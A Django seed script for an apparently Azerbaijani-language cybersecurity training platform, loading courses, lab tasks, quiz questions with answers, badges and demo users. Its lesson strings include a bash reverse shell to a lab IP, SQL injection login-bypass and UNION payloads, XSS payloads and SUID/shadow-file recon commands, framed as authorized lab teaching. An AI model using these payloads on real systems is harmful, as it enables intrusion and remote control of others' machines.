"""Seed realistic cybersecurity learning content.

Run:
    python manage.py seed_data                # idempotent, keeps users
    python manage.py seed_data --reset        # wipes courses/rooms/profiles first
    python manage.py seed_data --demo-users   # also creates a handful of demo learners
"""
from django.core.management.base import BaseCommand
from django.db import transaction
from django.utils.text import slugify

from accounts.models import Activity, Badge, UserBadge, UserProfile
from courses.models import (
    Category,
    Course,
    Enrollment,
    LearningPlan,
    LearningPlanCourse,
    Lesson,
    Question,
    QuestionChoice,
    Room,
    RoomTag,
    Task,
    TaskAnswerKind,
    TaskQuestion,
    TaskQuestionChoice,
    Exam,
    ExamQuestion,
)

from django.contrib.auth.models import User


CATEGORIES = [
    {"name": "Offensive Security", "slug": "offensive", "icon": "⚔️", "color": "#ff5672",
     "description": "Red team, exploitation, adversary simulation."},
    {"name": "Defensive Security", "slug": "defensive", "icon": "🛡️", "color": "#5b8bff",
     "description": "Blue team, SOC, incident response, detection."},
    {"name": "Web Security", "slug": "web", "icon": "🕸️", "color": "#ffb46b",
     "description": "Web application pentesting and bug hunting."},
    {"name": "Network", "slug": "network", "icon": "🌐", "color": "#6fd9a8",
     "description": "Network recon, protocols, firewalls, pivoting."},
    {"name": "Cloud & DevSecOps", "slug": "cloud", "icon": "☁️", "color": "#8ed8e8",
     "description": "AWS / Azure / GCP hardening and attack surface."},
    {"name": "OSINT", "slug": "osint", "icon": "🔎", "color": "#c29dff",
     "description": "Open-source intelligence and reconnaissance."},
]


TAGS = [
    "linux", "windows", "recon", "enumeration", "exploit", "privesc",
    "burp", "sqli", "xss", "ssrf", "lfi", "xxe",
    "nmap", "wireshark", "osint", "dfir", "siem",
    "cloud", "docker", "kubernetes", "active-directory",
    "crypto", "mobile", "malware", "reverse-engineering",
]


def md_join(*blocks):
    return "\n\n".join(b.strip() for b in blocks if b)


BLUE_ROOM_INTRO = md_join(
    "## Genişhesablanan Təhdidlər",
    "Bu otaqda biz bir SOC (Security Operations Center) analistinin **birinci günü**nü simulyasiya edirik. "
    "Hədəflər:",
    "- SIEM dashboard-da ilk alert-i triage etmək\n- Log-lardan atacker timeline-ı yığmaq\n- MITRE ATT&CK map-ə görə reaksiya vermək",
    "> **İpucu:** Hər task-da sual sonunda konkret bir flag və ya açar sözə bax.",
)


RED_ROOM_INTRO = md_join(
    "## Red Team Operation",
    "Hədəf şəbəkəsinə external recon ilə başlayırıq. Sən *authorized* pentester-sən və "
    "müştərinin external-facing asset-lərini test edirsən.",
    "```bash\n$ nmap -sV -Pn -T4 target.lab\n```",
    "Bu otaq **stealth recon**-dan `foothold`-a qədər axını əhatə edir. "
    "Hər task-ın cavabı sənə növbəti addım üçün lazım olan məlumatı verir.",
)


TASK_LINUX_INTRO = md_join(
    "# Linux Fundamentals — Başlanğıc",
    "Praktik hacker Linux-da rahat olmalıdır. Burada `bash`, `grep`, `awk`, `find` və "
    "`netstat` kimi alətlərdən istifadə edəcəyik.",
    "## Komanda",
    "```bash\n$ cat /etc/os-release | grep PRETTY_NAME\n```",
    "## Suallar\nAşağıdakı sualları vaxt ayırıb oxu; hər biri sənə bir praktik vərdiş qazandırır.",
)


TASK_NMAP_CONTENT = md_join(
    "# Aktiv Recon — nmap ilə",
    "`nmap` ən çox istifadə edilən port-scan alətidir. Əsas syntax:",
    "```bash\n$ nmap -sV -sC -p- target.lab\n```",
    "- `-sV` service/version detection\n- `-sC` default NSE script-ləri\n- `-p-` bütün 65535 port",
    "## Praktik",
    "Təsəvvür et `10.10.42.18` hədəfinə scan vurmusan:",
    "```\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9\n80/tcp   open  http    nginx 1.25\n443/tcp  open  https   TLS 1.3\n3306/tcp open  mysql   MySQL 8.0.32\n```",
)


TASK_WEB_SQLI = md_join(
    "# SQL Injection 101",
    "Login form-u bu sorğunu göndərir:",
    "```sql\nSELECT * FROM users WHERE email='$input' AND password='$pw';\n```",
    "Hər hansı parametr sanitize edilmədikdə `'--` və ya `' OR 1=1 --` payload-ı tam autentifikasiya bypass-ına gətirib çıxara bilər.",
    "## Payload-lar",
    "```sql\nadmin' --\nadmin' OR '1'='1' --\n```",
    "Burp Suite-də `Repeater` ilə sınaqdan keçir.",
)


TASK_OSINT_WHOIS = md_join(
    "# OSINT — `whois` və DNS",
    "Hər hücumun birinci addımı **passive recon**-dur. `whois` qeydiyyatı, `dig` DNS-i çıxarır:",
    "```bash\n$ whois example.az\n$ dig example.az any +short\n```",
    "Diqqət: bəzi registrar-lar `whois` məlumatını gizlədir — o zaman RDAP və ya `crt.sh` istifadə et.",
)


TASK_SOC_LOG = md_join(
    "# Log Triage — ilk 10 dəqiqə",
    "Bir SIEM-də aşağıdakı alert görünür:",
    "```\n[2026-04-23 09:14:22] auth.failure user=admin src=203.0.113.42 attempts=147\n```",
    "Bu tipik bir **brute-force** göstəricisidir. İlk 3 addımı yadda saxla:",
    "1. Source IP-ni WHOIS ilə oxu\n2. Həmin IP-nin 24 saat ərzindəki bütün auth hadisələrinə bax\n3. `User-Agent` və `geo-velocity` anomaliyalarını qeyd et",
)


def ensure_tags():
    created = {}
    for tag_name in TAGS:
        tag, _ = RoomTag.objects.get_or_create(slug=tag_name, defaults={"name": tag_name.replace("-", " ").title()})
        created[tag_name] = tag
    return created


def ensure_categories():
    created = {}
    for data in CATEGORIES:
        cat, _ = Category.objects.update_or_create(
            slug=data["slug"],
            defaults={
                "name": data["name"],
                "icon": data["icon"],
                "color": data["color"],
                "description": data["description"],
            },
        )
        created[data["slug"]] = cat
    return created


def ensure_course(categories, *, title, slug, category_slug, description, icon):
    course, _ = Course.objects.update_or_create(
        slug=slug,
        defaults={
            "title": title,
            "description": description,
            "category": categories.get(category_slug),
            "icon": icon,
            "is_published": True,
        },
    )
    return course


def ensure_room(*, course, title, summary, description, level, minutes, points, icon, color, order, tag_slugs, tags):
    room, _ = Room.objects.update_or_create(
        slug=slugify(title),
        defaults={
            "course": course,
            "title": title,
            "summary": summary,
            "description": description,
            "icon": icon,
            "cover_color": color,
            "level": level,
            "estimated_minutes": minutes,
            "points": points,
            "order": order,
            "is_published": True,
        },
    )
    room.tags.set([tags[t] for t in tag_slugs if t in tags])
    return room


def ensure_task(*, room, title, content, order, points, questions):
    task, _ = Task.objects.update_or_create(
        room=room,
        slug=slugify(title),
        defaults={
            "title": title,
            "content": content,
            "order": order,
            "points": points,
        },
    )
    # Replace questions idempotently
    task.questions.all().delete()
    for idx, q in enumerate(questions, start=1):
        tq = TaskQuestion.objects.create(
            task=task,
            prompt=q["prompt"],
            kind=q.get("kind", TaskAnswerKind.TEXT),
            answer=q.get("answer", ""),
            hint=q.get("hint", ""),
            hint_cost=q.get("hint_cost", 5),
            explanation=q.get("explanation", ""),
            points=q.get("points", 10),
            order=idx,
            case_sensitive=q.get("case_sensitive", False),
        )
        for choice in q.get("choices", []):
            TaskQuestionChoice.objects.create(
                question=tq,
                text=choice["text"],
                is_correct=choice.get("is_correct", False),
                order=choice.get("order", 1),
            )
    return task


def build_offensive_track(categories, tags):
    course = ensure_course(
        categories,
        title="Offensive Security Foundations",
        slug="offensive-foundations",
        category_slug="offensive",
        description="Red team-ə giriş: recon, foothold, privilege escalation, post-exploit.",
        icon="⚔️",
    )

    # Room 1
    room1 = ensure_room(
        course=course,
        title="Linux Combat Basics",
        summary="Hacker-in şəxsi silahı: komanda sətri, bash və file-system enumeration.",
        description=md_join(
            "## Nə öyrənirsən",
            "- Praktik Linux navigation və yaddaşında saxlanacaq komandalar\n- Fayllarla `find`, `grep`, `awk` əməliyyatları\n- `chmod`, `chown`, `SUID` bit və təhlükəsizlik nəticələri",
            "Bu otaq Offensive Track-ın başlanğıcıdır. Vaxt ayır, sualların hər birini *terminal*-da yoxla.",
        ),
        level="beginner",
        minutes=45, points=150, icon="🐧", color="#ff5672", order=1,
        tag_slugs=["linux", "enumeration", "recon"], tags=tags,
    )
    ensure_task(
        room=room1, title="Intro to Linux", content=TASK_LINUX_INTRO, order=1, points=20,
        questions=[
            {"prompt": "Hansı komanda işlədiyin distro-nun adını çıxarır?",
             "kind": TaskAnswerKind.TEXT, "answer": "lsb_release -a",
             "hint": "`lsb_release` və ya `/etc/os-release` faylına bax.",
             "explanation": "Çox distro-da `lsb_release -a` daha gözəl format verir, alternativ `cat /etc/os-release`."},
            {"prompt": "Hansı faylda istifadəçi parolu hash-ləri saxlanılır?",
             "kind": TaskAnswerKind.TEXT, "answer": "/etc/shadow",
             "hint": "Root-only fayl, `/etc` altında.",
             "explanation": "`/etc/shadow` yalnız root üçün oxunandır; `/etc/passwd` yalnız metadata saxlayır."},
            {"prompt": "Hansı bayraq SUID binary-lərini tapmaq üçün `find`-a verilir?",
             "kind": TaskAnswerKind.TEXT, "answer": "-perm -4000",
             "hint": "Permission bit 4000 SUID deməkdir.",
             "explanation": "`find / -perm -4000 -type f 2>/dev/null` klassik privesc recon-dur."},
        ],
    )
    ensure_task(
        room=room1, title="File hunting", content=md_join(
            "# Fayl Axtarışı",
            "Hədəf sistemdə həssas fayllara necə çatırsan? `grep -R`, `find` və `locate`.",
            "```bash\n$ grep -R 'password' /var/www 2>/dev/null | head\n```",
        ), order=2, points=20,
        questions=[
            {"prompt": "`find . -name 'config.*'` komandasında `.` nəyi bildirir?",
             "kind": TaskAnswerKind.CHOICE, "points": 10,
             "choices": [
                 {"text": "Hidden faylları gizlədir", "is_correct": False, "order": 1},
                 {"text": "Cari qovluğu", "is_correct": True, "order": 2},
                 {"text": "Root qovluğunu", "is_correct": False, "order": 3},
                 {"text": "Home qovluğunu", "is_correct": False, "order": 4},
             ]},
            {"prompt": "`grep -R` bayrağı nəyi təmin edir?",
             "kind": TaskAnswerKind.TEXT, "answer": "recursive",
             "hint": "Alt-qovluqları da tarayır."},
        ],
    )

    # Room 2
    room2 = ensure_room(
        course=course,
        title="Nmap & Active Recon",
        summary="Port scanning, service version detection və NSE script-ləri.",
        description=md_join(
            "## Hədəf",
            "Bu otaqda sən bir lab mühitində port-scan aparıb service version-u müəyyən edirsən. ",
            "**Qeyd**: Real hədəflərdə yalnız yazılı icazən varsa test et.",
        ),
        level="beginner", minutes=60, points=200, icon="🧭", color="#5b8bff", order=2,
        tag_slugs=["nmap", "recon", "enumeration", "network"], tags=tags,
    )
    ensure_task(
        room=room2, title="First scan", content=TASK_NMAP_CONTENT, order=1, points=30,
        questions=[
            {"prompt": "22/tcp portunda hansı servis açıqdır (yuxarıdakı scan-da)?",
             "kind": TaskAnswerKind.TEXT, "answer": "ssh",
             "hint": "22 portu standart port olaraq bir remote-management servisi üçün istifadə olunur.",
             "explanation": "Port 22 default SSH portudur."},
            {"prompt": "Hansı nmap bayrağı versiya detection-ı aktiv edir?",
             "kind": TaskAnswerKind.TEXT, "answer": "-sV",
             "explanation": "`-sV` banner/probe ilə service version çıxarır."},
            {"prompt": "Hansı port open qalıb MySQL-dir?",
             "kind": TaskAnswerKind.NUMERIC, "answer": "3306",
             "explanation": "MySQL default 3306 portunda qulaq asır."},
        ],
    )
    ensure_task(
        room=room2, title="NSE Scripts", content=md_join(
            "# Nmap Scripting Engine",
            "NSE script-ləri avtomatlaşdırılmış enumeration üçün güclüdür:",
            "```bash\n$ nmap --script vuln -p 80,443 target.lab\n```",
            "Script kateqoriyaları: `safe`, `default`, `vuln`, `exploit`, `auth`.",
        ), order=2, points=30,
        questions=[
            {"prompt": "Vuln kateqoriyalı NSE script-lər hansı bayraqla çağırılır?",
             "kind": TaskAnswerKind.TEXT, "answer": "--script vuln",
             "hint": "`--script` + kateqoriya adı.",
             "explanation": "`--script vuln` bütün zəiflik yoxlayan script-ləri qaçırır."},
        ],
    )

    # Room 3
    room3 = ensure_room(
        course=course,
        title="Foothold & Reverse Shells",
        summary="Initial access, shell upgrade, və post-exploit enumeration.",
        description="RCE-dən sonra ilk 5 dəqiqədə nə etməli? Bu otaqda şellar və stabilization.",
        level="intermediate", minutes=75, points=300, icon="🐚", color="#ffb46b", order=3,
        tag_slugs=["exploit", "privesc", "linux"], tags=tags,
    )
    ensure_task(
        room=room3, title="Reverse shell payload",
        content=md_join(
            "# Reverse Shell",
            "Target-də RCE-n var. Callback üçün bash reverse shell payload-ı:",
            "```bash\nbash -i >& /dev/tcp/10.10.14.3/4444 0>&1\n```",
            "Listener:",
            "```bash\n$ nc -lvnp 4444\n```",
        ), order=1, points=40,
        questions=[
            {"prompt": "Netcat-la listener başlatmaq üçün bayraqlar?",
             "kind": TaskAnswerKind.TEXT, "answer": "-lvnp",
             "hint": "listen, verbose, numeric, port.",
             "explanation": "`nc -lvnp <port>` standart pentest listener-idir."},
            {"prompt": "`/dev/tcp/HOST/PORT` bash-da nə edir?",
             "kind": TaskAnswerKind.TEXT, "answer": "tcp connection",
             "case_sensitive": False,
             "explanation": "Bash `/dev/tcp` pseudo-device-ı TCP socket açır."},
        ],
    )
    ensure_task(
        room=room3, title="Shell Stabilization",
        content=md_join(
            "# TTY Upgrade",
            "Dumb shell-i full TTY-a çevirmək:",
            "```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n# Ctrl-Z, sonra host-da:\nstty raw -echo; fg\n```",
        ), order=2, points=40,
        questions=[
            {"prompt": "Python ilə TTY spawn etmək üçün hansı modul istifadə edilir?",
             "kind": TaskAnswerKind.TEXT, "answer": "pty",
             "explanation": "`pty.spawn('/bin/bash')` ən qısa TTY upgrade."},
        ],
    )

    return course, [room1, room2, room3]


def build_defensive_track(categories, tags):
    course = ensure_course(
        categories,
        title="SOC Analyst — Blue Team Essentials",
        slug="soc-analyst-essentials",
        category_slug="defensive",
        description="Log triage, SIEM, incident response və MITRE ATT&CK map-ləmə.",
        icon="🛡️",
    )

    room1 = ensure_room(
        course=course,
        title="Log Triage Bootcamp",
        summary="SIEM-də ilk alert-i oxumaq, triage etmək və escalation qərarı vermək.",
        description=BLUE_ROOM_INTRO,
        level="beginner", minutes=60, points=200, icon="📊", color="#5b8bff", order=1,
        tag_slugs=["siem", "dfir", "windows", "linux"], tags=tags,
    )
    ensure_task(
        room=room1, title="First alert triage", content=TASK_SOC_LOG, order=1, points=30,
        questions=[
            {"prompt": "Yuxarıdakı alert hansı hücum tipinə uyğundur?",
             "kind": TaskAnswerKind.CHOICE, "points": 15,
             "choices": [
                 {"text": "SQL Injection", "is_correct": False, "order": 1},
                 {"text": "Brute-force auth", "is_correct": True, "order": 2},
                 {"text": "DDoS", "is_correct": False, "order": 3},
                 {"text": "Supply-chain", "is_correct": False, "order": 4},
             ],
             "explanation": "Yüksək sayda uğursuz auth brute-force göstəricisidir."},
            {"prompt": "Attacker IP-ni hansı açar sözlə (field) tapdın? (yalnız field adı)",
             "kind": TaskAnswerKind.TEXT, "answer": "src",
             "hint": "Log sətrində `src=` hissəsinə bax."},
        ],
    )
    ensure_task(
        room=room1, title="MITRE ATT&CK map", content=md_join(
            "# MITRE ATT&CK",
            "Attacker TTP-lərini tactic/technique-lərə görə mapə çevir. Brute-force → **Credential Access** taktikası, `T1110` texnikası.",
            "Matrix bağlantısı: https://attack.mitre.org/techniques/T1110/",
        ), order=2, points=30,
        questions=[
            {"prompt": "Brute-force hansı texnika ID-sinə uyğundur?",
             "kind": TaskAnswerKind.TEXT, "answer": "T1110",
             "hint": "T11 ilə başlayır.", "case_sensitive": False,
             "explanation": "T1110 — Brute Force. Alt-texnikaları T1110.001..004."},
        ],
    )

    room2 = ensure_room(
        course=course,
        title="Wireshark & Network Forensics",
        summary="PCAP oxumaq, protokol anomaliyalarını tutmaq.",
        description="Network forensics analisti kimi PCAP faylını parçala.",
        level="intermediate", minutes=90, points=260, icon="🧪", color="#6fd9a8", order=2,
        tag_slugs=["wireshark", "network", "dfir"], tags=tags,
    )
    ensure_task(
        room=room2, title="Filter like a pro", content=md_join(
            "# Wireshark Display Filters",
            "`http.request.method == \"POST\"` — yalnız POST sorğular.",
            "`tcp.stream eq 5` — 5-ci TCP stream-ə fokus.",
            "`dns.qry.name contains \"evil\"` — DNS-də şübhəli domain.",
        ), order=1, points=30,
        questions=[
            {"prompt": "Hansı display filter yalnız DNS trafiki göstərir?",
             "kind": TaskAnswerKind.TEXT, "answer": "dns",
             "hint": "Protokol adı kiçik hərflərlə."},
            {"prompt": "TCP stream 7-ni izlə — filter?",
             "kind": TaskAnswerKind.TEXT, "answer": "tcp.stream eq 7",
             "explanation": "`tcp.stream eq <N>` ilə konkret axına fokuslanırsan."},
        ],
    )

    return course, [room1, room2]


def build_web_track(categories, tags):
    course = ensure_course(
        categories,
        title="Web Pentesting Lab",
        slug="web-pentesting-lab",
        category_slug="web",
        description="OWASP Top 10 ilə işləyən praktik web-pentest laborları.",
        icon="🕸️",
    )

    room1 = ensure_room(
        course=course,
        title="SQL Injection Fundamentals",
        summary="In-band, blind və time-based SQLi praktikası.",
        description=md_join(
            "## Hədəf",
            "Hazırda deploy olunmuş DVWA kimi bir lab-da SQLi payload-ları oyrənmək.",
            "⚠️ **Yalnız** öz lab-ında və ya icazəli mühitdə test et.",
        ),
        level="intermediate", minutes=80, points=260, icon="💉", color="#ff5672", order=1,
        tag_slugs=["sqli", "burp", "web"], tags=tags,
    )
    ensure_task(
        room=room1, title="Login bypass with SQLi", content=TASK_WEB_SQLI, order=1, points=40,
        questions=[
            {"prompt": "Klassik login bypass payload-ı (username sahəsinə)?",
             "kind": TaskAnswerKind.TEXT, "answer": "admin' --",
             "hint": "`' --` comment syntax SQL-da qalan şərti kəsir."},
            {"prompt": "Hansı OWASP Top 10 kategoriyasına SQLi aiddir (2021)?",
             "kind": TaskAnswerKind.CHOICE, "points": 10,
             "choices": [
                 {"text": "A01: Broken Access Control", "is_correct": False, "order": 1},
                 {"text": "A03: Injection", "is_correct": True, "order": 2},
                 {"text": "A05: Security Misconfiguration", "is_correct": False, "order": 3},
                 {"text": "A07: Identification and Authentication Failures", "is_correct": False, "order": 4},
             ]},
        ],
    )
    ensure_task(
        room=room1, title="Union-based extraction", content=md_join(
            "# UNION SELECT",
            "`UNION` ilə orijinal sorğuya əlavə ikinci sorğu birləşdirirsən.",
            "```sql\n' UNION SELECT username, password FROM users --\n```",
            "Column sayını `ORDER BY` ilə dəqiqləşdir:",
            "```sql\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --   # xəta → 2 sütun\n```",
        ), order=2, points=40,
        questions=[
            {"prompt": "Column sayını tapmaq üçün hansı SQL açar sözünü istifadə edirsən?",
             "kind": TaskAnswerKind.TEXT, "answer": "ORDER BY", "case_sensitive": False,
             "explanation": "`ORDER BY N` — N mövcud sütun sayından çoxdursa SQL xəta qaytarır."},
        ],
    )

    room2 = ensure_room(
        course=course,
        title="XSS Playground",
        summary="Reflected, stored və DOM XSS-i praktik aşkarlamaq.",
        description="Cross-site scripting ilə cookie theft və session hijack.",
        level="intermediate", minutes=60, points=180, icon="⚡", color="#ffb46b", order=2,
        tag_slugs=["xss", "web", "burp"], tags=tags,
    )
    ensure_task(
        room=room2, title="Reflected XSS",
        content=md_join(
            "# Reflected XSS",
            "Search parametri HTML-də encode edilmədən göstərilirsə:",
            "```\nhttps://target.lab/search?q=<script>alert(1)</script>\n```",
            "Simple proof-of-concept payload-lar:",
            "- `<script>alert(1)</script>`\n- `\"><img src=x onerror=alert(1)>`",
        ), order=1, points=30,
        questions=[
            {"prompt": "Image onerror handler ilə ən qısa XSS payload-ı?",
             "kind": TaskAnswerKind.TEXT, "answer": "<img src=x onerror=alert(1)>",
             "explanation": "`<img src=x onerror=alert(1)>` — `src` xətalı olduqda `onerror` işləyir."},
        ],
    )

    return course, [room1, room2]


def build_osint_track(categories, tags):
    course = ensure_course(
        categories,
        title="OSINT Mastery",
        slug="osint-mastery",
        category_slug="osint",
        description="Public məlumatdan hədəf profili qurmaq.",
        icon="🔎",
    )

    room1 = ensure_room(
        course=course,
        title="Domain & DNS Recon",
        summary="whois, RDAP, passive DNS və crt.sh ilə asset discovery.",
        description="İlk passiv recon üçün əsas alətlər.",
        level="beginner", minutes=50, points=160, icon="🌍", color="#c29dff", order=1,
        tag_slugs=["osint", "recon", "network"], tags=tags,
    )
    ensure_task(
        room=room1, title="Domain footprinting", content=TASK_OSINT_WHOIS, order=1, points=30,
        questions=[
            {"prompt": "Public certificate transparency-də subdomain tapmaq üçün ən populyar servis?",
             "kind": TaskAnswerKind.TEXT, "answer": "crt.sh",
             "hint": "Comodo-nun tapdığı tez-istifadə olunan açıq portal.",
             "explanation": "`crt.sh` CT log-larını axtarış üçün açır, subdomain mining üçün #1."},
            {"prompt": "DNS-də email göndərən serverlərin qeydi hansıdır?",
             "kind": TaskAnswerKind.TEXT, "answer": "mx",
             "case_sensitive": False,
             "explanation": "MX (Mail Exchanger) record."},
        ],
    )

    return course, [room1]


BADGES = [
    {"slug": "first-blood", "name": "First Blood", "description": "Birinci task tamamlandı", "icon": "🩸", "color": "#ff5672",
     "criteria": Badge.Criteria.FIRST_TASK, "criteria_value": "", "order": 1},
    {"slug": "room-runner", "name": "Room Runner", "description": "Birinci otağı tamamla", "icon": "🧭", "color": "#5b8bff",
     "criteria": Badge.Criteria.FIRST_ROOM, "criteria_value": "", "order": 2},
    {"slug": "ten-tasks", "name": "10x Operator", "description": "10 task tamamla", "icon": "⚡", "color": "#ffb46b",
     "criteria": Badge.Criteria.TASKS_COUNT, "criteria_value": "10", "order": 3},
    {"slug": "fifty-tasks", "name": "Task Machine", "description": "50 task tamamla", "icon": "🤖", "color": "#6fd9a8",
     "criteria": Badge.Criteria.TASKS_COUNT, "criteria_value": "50", "order": 4},
    {"slug": "bronze-rank", "name": "Bronze", "description": "500 XP-yə çat", "icon": "🥉", "color": "#c29dff",
     "criteria": Badge.Criteria.XP_THRESHOLD, "criteria_value": "500", "order": 5},
    {"slug": "silver-rank", "name": "Silver", "description": "2500 XP-yə çat", "icon": "🥈", "color": "#8ed8e8",
     "criteria": Badge.Criteria.XP_THRESHOLD, "criteria_value": "2500", "order": 6},
    {"slug": "gold-rank", "name": "Gold", "description": "9000 XP-yə çat", "icon": "🥇", "color": "#ffd06b",
     "criteria": Badge.Criteria.XP_THRESHOLD, "criteria_value": "9000", "order": 7},
    {"slug": "week-streak", "name": "On Fire", "description": "7 günlük streak", "icon": "🔥", "color": "#ff5672",
     "criteria": Badge.Criteria.STREAK, "criteria_value": "7", "order": 8},
    {"slug": "exam-passer", "name": "Certified", "description": "İlk exam-dan keç", "icon": "🎓", "color": "#5b8bff",
     "criteria": Badge.Criteria.EXAM_PASS, "criteria_value": "", "order": 9},
]


def ensure_badges():
    for data in BADGES:
        Badge.objects.update_or_create(slug=data["slug"], defaults=data)


def build_plans(courses_by_slug):
    def upsert_plan(slug, title, summary, description, level, hours, icon, featured, course_slugs):
        plan, _ = LearningPlan.objects.update_or_create(
            slug=slug,
            defaults={
                "title": title,
                "summary": summary,
                "description": description,
                "level": level,
                "estimated_hours": hours,
                "icon": icon,
                "is_featured": featured,
                "is_published": True,
            },
        )
        LearningPlanCourse.objects.filter(plan=plan).delete()
        for idx, cs in enumerate(course_slugs, start=1):
            if cs in courses_by_slug:
                LearningPlanCourse.objects.create(plan=plan, course=courses_by_slug[cs], order=idx)
        return plan

    upsert_plan(
        "red-team-path", "Red Team Operator",
        "Offensive security pathway — recon-dan privilege escalation-a.",
        "Linux fundamentals → active recon → foothold → post-exploit. 3 otaq və 1 exam.",
        "intermediate", 40, "⚔️", True,
        ["offensive-foundations", "web-pentesting-lab"],
    )
    upsert_plan(
        "blue-team-path", "Blue Team Analyst",
        "SOC analyst roadmap — log triage, SIEM və DFIR.",
        "SIEM triage → MITRE mapping → network forensics → IR playbook.",
        "beginner", 35, "🛡️", True,
        ["soc-analyst-essentials"],
    )
    upsert_plan(
        "web-hunter-path", "Web Bug Hunter",
        "Bug bounty-üçün web-pentest path-ı.",
        "SQLi, XSS, SSRF, IDOR, authz-flow bug-ları.",
        "intermediate", 30, "🕸️", False,
        ["web-pentesting-lab"],
    )
    upsert_plan(
        "recon-ops", "Recon & OSINT Ops",
        "Passive və active recon üzrə dərinləşmə.",
        "OSINT → domain recon → active scan → attack surface map.",
        "beginner", 20, "🔎", False,
        ["osint-mastery", "offensive-foundations"],
    )


def build_legacy_exam(courses_by_slug):
    """Keep the existing Exam flow usable with a tiny seed."""
    course = courses_by_slug.get("soc-analyst-essentials")
    if not course:
        return
    exam, _ = Exam.objects.update_or_create(
        slug="soc-triage-exam",
        defaults={
            "course": course,
            "title": "SOC Triage Mini Exam",
            "description": "Log triage və MITRE mapping üzrə qısa imtahan.",
            "instructions": "Bütün sualları cavablandır, müddət 30 dəqiqə.",
            "level": "beginner",
            "time_limit_minutes": 30,
            "is_published": True,
        },
    )
    if exam.questions.exists():
        return
    q1 = Question.objects.create(
        course=course, title="Brute-force texnikası", prompt="MITRE ATT&CK-da brute-force technique ID-si nədir?",
        question_type="closed", level="beginner", points=20, order=1,
    )
    QuestionChoice.objects.create(question=q1, text="T1059", is_correct=False, order=1)
    QuestionChoice.objects.create(question=q1, text="T1110", is_correct=True, order=2)
    QuestionChoice.objects.create(question=q1, text="T1190", is_correct=False, order=3)
    QuestionChoice.objects.create(question=q1, text="T1566", is_correct=False, order=4)
    ExamQuestion.objects.create(exam=exam, question=q1, order=1)

    q2 = Question.objects.create(
        course=course, title="SIEM yanaşması", prompt="Triage zamanı ilk 10 dəqiqədə hansı iki addımı atırsan?",
        question_type="open", level="beginner", points=20, order=2,
    )
    ExamQuestion.objects.create(exam=exam, question=q2, order=2)


def create_demo_users(username_password_map):
    created = []
    for username, (password, xp) in username_password_map.items():
        user, was_created = User.objects.get_or_create(
            username=username,
            defaults={"email": f"{username}@demo.xakker.org", "is_staff": False, "is_superuser": False},
        )
        if was_created:
            user.set_password(password)
            user.save()
        profile, _ = UserProfile.objects.get_or_create(user=user)
        profile.xp = xp
        profile.tasks_completed = max(xp // 40, 1)
        profile.rooms_completed = max(xp // 300, 0)
        profile.streak_days = max(xp // 200, 0)
        profile.bio = f"Demo learner @{username}"
        profile.country = "AZ"
        profile.avatar_hue = (xp * 13) % 360
        profile.recompute_rank()
        profile.save()
        created.append(user)
    return created


def wipe_all():
    Activity.objects.all().delete()
    UserBadge.objects.all().delete()
    # Keep Badge definitions (will be upserted)
    TaskQuestionChoice.objects.all().delete()
    TaskQuestion.objects.all().delete()
    Task.objects.all().delete()
    Room.objects.all().delete()
    RoomTag.objects.all().delete()
    Lesson.objects.all().delete()
    ExamQuestion.objects.all().delete()
    QuestionChoice.objects.all().delete()
    Question.objects.all().delete()
    Exam.objects.all().delete()
    Enrollment.objects.all().delete()
    LearningPlanCourse.objects.all().delete()
    LearningPlan.objects.all().delete()
    Course.objects.all().delete()
    Category.objects.all().delete()


class Command(BaseCommand):
    help = "Seed cybersec learning content (rooms, tasks, plans, badges)."

    def add_arguments(self, parser):
        parser.add_argument("--reset", action="store_true", help="Wipe data before seeding.")
        parser.add_argument("--demo-users", action="store_true", help="Create demo learners.")

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            self.stdout.write(self.style.WARNING("Wiping content…"))
            wipe_all()

        self.stdout.write("Categories & tags…")
        cats = ensure_categories()
        tags = ensure_tags()

        self.stdout.write("Courses + rooms…")
        off_course, off_rooms = build_offensive_track(cats, tags)
        def_course, def_rooms = build_defensive_track(cats, tags)
        web_course, web_rooms = build_web_track(cats, tags)
        osint_course, osint_rooms = build_osint_track(cats, tags)
        all_rooms = [*off_rooms, *def_rooms, *web_rooms, *osint_rooms]

        courses_by_slug = {
            off_course.slug: off_course,
            def_course.slug: def_course,
            web_course.slug: web_course,
            osint_course.slug: osint_course,
        }

        self.stdout.write("Plans…")
        build_plans(courses_by_slug)

        self.stdout.write("Legacy exam…")
        build_legacy_exam(courses_by_slug)

        self.stdout.write("Badges…")
        ensure_badges()

        if opts.get("demo_users"):
            self.stdout.write("Demo users…")
            create_demo_users({
                "narmin":   ("hacker123", 4200),
                "elvin":    ("hacker123", 7800),
                "samir":    ("hacker123", 2100),
                "aysel":    ("hacker123", 15200),
                "leyla":    ("hacker123", 980),
                "ramin":    ("hacker123", 520),
            })

        self.stdout.write(self.style.SUCCESS(
            f"Seed complete: {Course.objects.count()} courses, "
            f"{Room.objects.count()} rooms, {Task.objects.count()} tasks, "
            f"{TaskQuestion.objects.count()} questions, {LearningPlan.objects.count()} plans, "
            f"{Badge.objects.count()} badges."
        ))
